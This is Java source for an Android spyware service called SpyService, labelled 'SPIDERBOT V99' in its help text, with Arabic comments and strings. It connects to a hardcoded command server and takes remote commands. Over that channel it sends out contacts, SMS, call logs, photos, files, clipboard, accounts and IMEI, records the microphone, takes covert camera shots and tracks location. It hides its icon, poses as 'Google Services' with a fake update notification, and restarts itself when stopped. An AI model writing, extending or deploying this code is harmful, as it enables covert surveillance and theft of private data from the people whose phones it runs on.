package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private String deviceId;
    private Camera camera;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private boolean foregroundStarted = false;

    // ====== اتصال الخادم ======
    private static final String SERVER_IP = "192.168.1.100"; // غيّر إلى IP هاتف المدير
    private static final int SERVER_PORT = 8080;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private boolean isConnected = false;
    private String pendingCommand = null;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        startForegroundService();

        // الاتصال بالخادم فوراً
        connectToServer();

        // جدولة إعادة المحاولة إذا انقطع الاتصال
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::checkConnection, 10, 10, TimeUnit.SECONDS);
    }

    private void startForegroundService() {
        if (foregroundStarted) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_LOW);
                getSystemService(NotificationManager.class).createNotificationChannel(ch);
            }
            startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
                    .setContentTitle("Google Services")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setSilent(true)
                    .build());
            foregroundStarted = true;
        } catch (SecurityException e) {
            Log.e(TAG, "Foreground failed", e);
        }
    }

    // ====== الاتصال بالخادم ======

    private void connectToServer() {
        new Thread(() -> {
            try {
                if (socket != null) {
                    try { socket.close(); } catch (Exception e) {}
                }
                socket = new Socket(SERVER_IP, SERVER_PORT);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // تسجيل الجهاز فوراً
                registerDevice();

                isConnected = true;
                Log.d(TAG, "✅ Connected to server");

                // بدء الاستماع للأوامر
                listenForCommands();
            } catch (Exception e) {
                Log.e(TAG, "❌ Connection failed: " + e.getMessage());
                isConnected = false;
                // إعادة المحاولة بعد 5 ثوانٍ
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::connectToServer, 5000);
            }
        }).start();
    }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("device_id", deviceId);
            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());

            out.println("REGISTER:" + info.toString());
            Log.d(TAG, "📤 Registration sent");
        } catch (Exception e) {
            Log.e(TAG, "Registration error", e);
        }
    }

    private void listenForCommands() {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                Log.d(TAG, "📩 Command received: " + line);
                if (line.startsWith("CMD:")) {
                    String cmd = line.substring(4).trim();
                    executeCommand(cmd);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Listening error: " + e.getMessage());
            isConnected = false;
            connectToServer();
        }
    }

    private void checkConnection() {
        if (!isConnected || socket == null || socket.isClosed()) {
            connectToServer();
        }
    }

    // ====== إرسال البيانات إلى الخادم ======

    private void sendData(String type, String data) {
        try {
            if (out != null) {
                out.println("DATA:" + type + "|" + data);
                Log.d(TAG, "📤 Data sent: " + type);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Send data error: " + e.getMessage());
        }
    }

    private void sendFileToServer(File file, String caption) {
        try {
            // نرسل الملف مشفراً كـ Base64 (يمكن تحسينه لاحقاً)
            byte[] bytes = new byte[(int) file.length()];
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            fis.read(bytes);
            fis.close();
            String base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT);
            JSONObject json = new JSONObject();
            json.put("name", file.getName());
            json.put("data", base64);
            json.put("caption", caption);
            sendData("FILE", json.toString());
            file.delete();
        } catch (Exception e) {
            Log.e(TAG, "❌ Send file error: " + e.getMessage());
        }
    }

    // ====== تنفيذ الأوامر ======

    private void executeCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "⚡ Executing: " + lower);

        try {
            switch (lower) {
                case "get_contacts": sendFileToServer(collectContacts(), "📇 جهات الاتصال"); break;
                case "get_sms": sendFileToServer(collectSms(), "💬 الرسائل النصية"); break;
                case "get_calllogs": sendFileToServer(collectCallLogs(), "📞 سجل المكالمات"); break;
                case "get_location": getLocation(); break;
                case "start_record": startRecording(); break;
                case "stop_record": stopRecording(); break;
                case "get_apps": sendFileToServer(collectApps(), "📱 التطبيقات"); break;
                case "get_photos": sendFileToServer(collectMedia("images"), "🖼 الصور"); break;
                case "get_videos": sendFileToServer(collectMedia("videos"), "🎬 الفيديوهات"); break;
                case "get_files": sendFileToServer(collectAllFiles(), "📦 الملفات"); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "fake_notif": showFakeNotification(); break;
                case "take_photo": takePhoto(); break;
                case "take_photo_front": takePhotoFront(); break;
                case "flash_on": flashOn(); break;
                case "flash_off": flashOff(); break;
                case "get_imei": getImei(); break;
                case "get_phone": getPhoneNumber(); break;
                case "get_sim": getSimInfo(); break;
                case "get_wifi": getWifiInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getPublicIp(); break;
                case "lock_device": lockDevice(); break;
                case "reboot": rebootDevice(); break;
                case "shutdown": shutdownDevice(); break;
                case "get_accounts": getAccounts(); break;
                case "get_clipboard": getClipboard(); break;
                case "get_device": getDeviceInfo(); break;
                case "get_network": getNetworkInfo(); break;
                case "start_location_track": startLocationTracking(); break;
                case "stop_location_track": stopLocationTracking(); break;
                default:
                    sendData("ERROR", "أمر غير معروف: " + cmd);
            }
        } catch (Exception e) {
            sendData("ERROR", "خطأ: " + e.getMessage());
            Log.e(TAG, "❌ Execute error", e);
        }
    }

    // ========== قائمة المساعدة (لن تُستخدم مع الخادم، لكن نتركها) ==========
    private void sendHelp() {
        String help = "🕷️ **SPIDERBOT V99** 🕷️\n\n" +
                "🔴 أوامر السرقة:\n" +
                "get_contacts, get_sms, get_calllogs, get_location\n" +
                "get_photos, get_videos, get_files, get_clipboard\n\n" +
                "⚫ أوامر التحكم:\n" +
                "hide_app, show_app, fake_notif, take_photo, take_photo_front\n" +
                "flash_on, flash_off, lock_device, reboot, shutdown\n\n" +
                "🟢 أوامر المعلومات:\n" +
                "get_imei, get_phone, get_sim, get_wifi, get_battery, get_ip\n" +
                "get_accounts, get_device, get_network, get_apps";
        sendData("HELP", help);
    }

    // ======================================================================
    // ========== دوال جمع البيانات (كما هي من الكود السابق) ==========
    // ======================================================================

    private File collectContacts() throws Exception {
        File f = new File(getCacheDir(), "contacts.txt");
        FileOutputStream fos = new FileOutputStream(f);
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                fos.write((name + " : " + phone + "\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectSms() throws Exception {
        File f = new File(getCacheDir(), "sms.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                fos.write(("من: " + address + "\n" + body + "\n---\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectCallLogs() throws Exception {
        File f = new File(getCacheDir(), "call_log.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                fos.write(("رقم: " + number + " | الاسم: " + name + " | النوع: " + type + " | المدة: " + duration + "s\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectApps() throws Exception {
        File f = new File(getCacheDir(), "apps.txt");
        FileOutputStream fos = new FileOutputStream(f);
        PackageManager pm = getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
        for (android.content.pm.PackageInfo pkg : packages) {
            String name = pkg.applicationInfo.loadLabel(pm).toString();
            fos.write((name + " | " + pkg.packageName + "\n").getBytes());
        }
        fos.close();
        return f;
    }

    private File collectMedia(String type) throws Exception {
        File zipFile = new File(getCacheDir(), type + ".zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        Uri uri = type.equals("images") ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DISPLAY_NAME};
        Cursor cursor = getContentResolver().query(uri, projection, null, null,
                MediaStore.MediaColumns.DATE_ADDED + " DESC LIMIT 30");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(0);
                String name = cursor.getString(1);
                File file = new File(path);
                if (file.exists()) {
                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    ZipEntry ze = new ZipEntry(name);
                    zos.putNextEntry(ze);
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                    zos.closeEntry();
                    fis.close();
                }
            }
            cursor.close();
        }
        zos.close();
        return zipFile;
    }

    private File collectAllFiles() throws Exception {
        File zipFile = new File(getCacheDir(), "all_files.zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM");
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists()) addDirToZip(zos, download, "Downloads");
        zos.close();
        return zipFile;
    }

    private void addDirToZip(ZipOutputStream zos, File dir, String parent) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile() && f.length() < 20 * 1024 * 1024) {
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                ZipEntry ze = new ZipEntry(parent + "/" + f.getName());
                zos.putNextEntry(ze);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                zos.closeEntry();
                fis.close();
            }
        }
    }

    private void getLocation() {
        try {
            Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                sendData("LOCATION", loc.getLatitude() + "," + loc.getLongitude());
            } else {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                    @Override public void onLocationChanged(Location l) {
                        sendData("LOCATION", l.getLatitude() + "," + l.getLongitude());
                    }
                    @Override public void onStatusChanged(String p, int s, Bundle b) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onProviderDisabled(String p) {}
                }, Looper.getMainLooper());
            }
        } catch (SecurityException e) {
            sendData("ERROR", "صلاحية الموقع غير مفعلة");
        }
    }

    private void startRecording() {
        try {
            audioPath = getCacheDir() + "/recording.mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            isRecording = true;
            sendData("RECORD", "started");
        } catch (Exception e) {
            sendData("ERROR", "فشل التسجيل: " + e.getMessage());
        }
    }

    private void stopRecording() {
        if (isRecording && recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
                File f = new File(audioPath);
                if (f.exists()) {
                    sendFileToServer(f, "🎤 تسجيل صوتي");
                }
                sendData("RECORD", "stopped");
            } catch (Exception e) {
                sendData("ERROR", "فشل إيقاف التسجيل: " + e.getMessage());
            }
        }
    }

    private void hideApp() {
        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        sendData("HIDE", "hidden");
    }

    private void showApp() {
        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        sendData("SHOW", "shown");
    }

    private void showFakeNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(ch);
        }
        nm.notify((int)(System.currentTimeMillis()%9999),
                new NotificationCompat.Builder(this, "fake")
                        .setContentTitle("📥 تحديث أمني")
                        .setContentText("تم تنزيل تحديث 245MB")
                        .setSmallIcon(android.R.drawable.stat_sys_download)
                        .setProgress(100, 45, false)
                        .setOngoing(true)
                        .build());
        sendData("NOTIFY", "fake notification sent");
    }

    private void takePhoto() {
        try {
            Camera camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(params);
            camera.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "photo.jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    sendFileToServer(file, "📸 صورة من الكاميرا الخلفية");
                } catch (Exception e) { Log.e(TAG, "photo err", e); }
            });
        } catch (Exception e) { sendData("ERROR", "فشل التصوير: " + e.getMessage()); }
    }

    private void takePhotoFront() {
        try {
            Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            camera.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "selfie.jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    sendFileToServer(file, "🤳 صورة سيلفي");
                } catch (Exception e) { Log.e(TAG, "selfie err", e); }
            });
        } catch (Exception e) { sendData("ERROR", "فشل التصوير الأمامي: " + e.getMessage()); }
    }

    private void flashOn() {
        try {
            camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
            camera.setParameters(params);
            camera.startPreview();
            sendData("FLASH", "on");
        } catch (Exception e) { sendData("ERROR", "فشل تشغيل الفلاش: " + e.getMessage()); }
    }

    private void flashOff() {
        try {
            if (camera != null) {
                camera.stopPreview();
                camera.release();
                camera = null;
                sendData("FLASH", "off");
            }
        } catch (Exception e) { sendData("ERROR", "فشل إطفاء الفلاش: " + e.getMessage()); }
    }

    private void getImei() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                String imei = tm.getImei();
                sendData("IMEI", imei != null ? imei : "غير متاح");
            } else {
                String imei = tm.getDeviceId();
                sendData("IMEI", imei != null ? imei : "غير متاح");
            }
        } catch (Exception e) { sendData("ERROR", "فشل قراءة IMEI"); }
    }

    private void getPhoneNumber() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String number = tm.getLine1Number();
            sendData("PHONE", number != null ? number : "غير متاح");
        } catch (Exception e) { sendData("ERROR", "فشل قراءة الرقم"); }
    }

    private void getSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String operator = tm.getSimOperatorName();
            String country = tm.getSimCountryIso();
            String serial = tm.getSimSerialNumber();
            sendData("SIM", operator + "|" + country + "|" + serial);
        } catch (Exception e) { sendData("ERROR", "فشل قراءة SIM"); }
    }

    private void getWifiInfo() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            String ssid = info.getSSID();
            int level = android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5);
            sendData("WIFI", ssid + "|" + level);
        } catch (Exception e) { sendData("ERROR", "فشل قراءة WiFi"); }
    }

    private void getBatteryInfo() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                int percentage = (level * 100) / scale;
                int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
                int voltage = batteryIntent.getIntExtra("voltage", 0);
                sendData("BATTERY", percentage + "|" + temp + "|" + voltage);
            }
        } catch (Exception e) { sendData("ERROR", "فشل قراءة البطارية"); }
    }

    private void getPublicIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            sendData("IP", ip);
        } catch (Exception e) { sendData("ERROR", "فشل الحصول على IP"); }
    }

    private void startLocationTracking() {
        if (isTrackingLocation) return;
        try {
            locationListener = new LocationListener() {
                @Override public void onLocationChanged(Location location) {
                    sendData("LOCATION_TRACK", location.getLatitude() + "," + location.getLongitude());
                }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
            isTrackingLocation = true;
            sendData("LOCATION_TRACK", "started");
        } catch (SecurityException e) {
            sendData("ERROR", "صلاحية الموقع غير مفعلة");
        }
    }

    private void stopLocationTracking() {
        if (!isTrackingLocation) return;
        try {
            locationManager.removeUpdates(locationListener);
            isTrackingLocation = false;
            sendData("LOCATION_TRACK", "stopped");
        } catch (Exception e) { sendData("ERROR", "فشل إيقاف التتبع"); }
    }

    private void getInstalledPackages() {
        try {
            PackageManager pm = getPackageManager();
            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            StringBuilder sb = new StringBuilder();
            int count = 0;
            for (android.content.pm.PackageInfo pkg : packages) {
                if (count++ > 50) break;
                sb.append(pkg.packageName).append("\n");
            }
            sendData("PACKAGES", sb.toString());
        } catch (Exception e) { sendData("ERROR", "فشل قراءة التطبيقات"); }
    }

    private void getRunningProcesses() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            List<android.app.ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            StringBuilder sb = new StringBuilder();
            int count = 0;
            for (android.app.ActivityManager.RunningAppProcessInfo p : processes) {
                if (count++ > 20) break;
                sb.append(p.processName).append("\n");
            }
            sendData("PROCESSES", sb.toString());
        } catch (Exception e) { sendData("ERROR", "فشل قراءة العمليات"); }
    }

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            sendData("LOCK", "locked");
        } catch (Exception e) { sendData("ERROR", "فشل قفل الجهاز: " + e.getMessage()); }
    }

    private void rebootDevice() {
        try {
            Runtime.getRuntime().exec("su -c reboot");
            sendData("REBOOT", "rebooting");
        } catch (Exception e) {
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                pm.reboot(null);
                sendData("REBOOT", "rebooting");
            } catch (Exception ex) {
                sendData("ERROR", "فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
            }
        }
    }

    private void shutdownDevice() {
        try {
            Runtime.getRuntime().exec("su -c shutdown");
            sendData("SHUTDOWN", "shutting down");
        } catch (Exception e) {
            sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
        }
    }

    private void getAccounts() {
        try {
            android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
            android.accounts.Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder();
            for (android.accounts.Account acc : accounts) {
                sb.append(acc.name).append(" (").append(acc.type).append(")\n");
            }
            sendData("ACCOUNTS", sb.toString());
        } catch (Exception e) { sendData("ERROR", "فشل قراءة الحسابات"); }
    }

    private void getClipboard() {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
            sendData("CLIPBOARD", text);
        } catch (Exception e) { sendData("ERROR", "فشل قراءة الحافظة"); }
    }

    private void getDeviceInfo() {
        String info = "الموديل: " + Build.MODEL + "\n" +
                "الشركة: " + Build.MANUFACTURER + "\n" +
                "أندرويد: " + Build.VERSION.RELEASE + "\n" +
                "API: " + Build.VERSION.SDK_INT + "\n" +
                "Android ID: " + deviceId;
        sendData("DEVICE_INFO", info);
    }

    private void getNetworkInfo() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            android.net.wifi.WifiInfo wifiInfo = wifi.getConnectionInfo();
            String info = "WiFi: " + (wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "غير متصل") + "\n" +
                    "القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(wifiInfo.getRssi(), 5) + "/5\n" +
                    "المشغل: " + ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getNetworkOperatorName();
            sendData("NETWORK_INFO", info);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة معلومات الشبكة");
        }
    }

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) return (level * 100) / scale;
            }
        } catch (Exception e) { Log.e(TAG, "battery err", e); }
        return -1;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) { camera.release(); camera = null; }
        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        if (socket != null) {
            try { socket.close(); } catch (Exception e) {}
        }
        startService(new Intent(this, SpyService.class));
    }
}
